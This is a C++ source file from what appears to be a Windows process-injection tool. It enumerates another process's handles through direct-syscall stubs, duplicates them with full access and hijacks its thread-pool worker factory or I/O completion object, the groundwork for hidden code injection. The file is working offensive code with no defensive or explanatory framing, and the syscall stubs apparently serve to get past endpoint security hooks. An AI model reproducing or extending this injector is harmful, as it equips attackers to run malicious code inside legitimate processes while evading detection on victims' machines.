#include "injector.h"
#include "../syscalls/Syscalls.h"
#include "structs.h"
#include<TlHelp32.h>

HANDLE Injector::hijackProcessHandle(const wchar_t* objName) {
	PVOID phandleInfo = NULL;
	ULONG handleInfoLen = 0;
	NTSTATUS status = NULL;
	handleInfoLen = 2 * 4 * 1024 * 4;
	phandleInfo = this->allocateHeap(handleInfoLen);
	
	status = Sw3NtQueryInformationProcess(this->targetProc, (PROCESSINFOCLASS)ProcessHandleInformation, phandleInfo, handleInfoLen, &handleInfoLen);

	auto handleInfo = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(phandleInfo);

	for (size_t i = 0; i < handleInfo->NumberOfHandles; i++)
	{	
		HANDLE dupHandle = NULL;
		auto handleObj = handleInfo->Handles[i];
		auto handleValue = handleObj.HandleValue;
		BOOL res; 
		if (wcscmp(objName, L"TpWorkerFactory") == 0) {
			res = DuplicateHandle(
				this->targetProc,
				handleInfo->Handles[i].HandleValue,
				this->currProc,
				&dupHandle,
				WORKER_FACTORY_ALL_ACCESS,
				FALSE,
				0
			);
		}
		else if (wcscmp(objName, L"IoCompletion") == 0) {
			res = DuplicateHandle(
				this->targetProc,
				handleInfo->Handles[i].HandleValue,
				this->currProc,
				&dupHandle,
				IO_COMPLETION_ALL_ACCESS,
				FALSE,
				0
			);

	
		}
		PVOID objInfo = NULL;
		ULONG objInfoLen = 0;

		objInfoLen = 1024 * 2 * 4;

		objInfo = this->allocateHeap(objInfoLen);

		status = Sw3NtQueryObject(dupHandle, (OBJECT_INFORMATION_CLASS)ObjectTypeInformation, objInfo, objInfoLen, &objInfoLen);

		auto objInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)objInfo;

		if (!objInformation->TypeName.Buffer || objInformation->TypeName.Length == 0) {
			this->closeHandle(dupHandle);
			this->cleanHeap(objInfo);
			continue;

		}
		if (wcscmp(objInformation->TypeName.Buffer, objName) == 0) {
			wokay(L"Found Object Of Type { %ls }", objName);
			return dupHandle;
		}

		this->cleanHeap(objInfo);
	}
	this->cleanHeap(phandleInfo);

	return (HANDLE)0;
}
WORKER_FACTORY_BASIC_INFORMATION Injector::getWorkerInfo(HANDLE hWorker) {
	WORKER_FACTORY_BASIC_INFORMATION workerInfo = { 0 };
	NTSTATUS okInfo = Sw3NtQueryInformationWorkerFactory(hWorker, WorkerFactoryBasicInformation, (PVOID) &workerInfo, sizeof(workerInfo), NULL);
	
	return workerInfo;

}
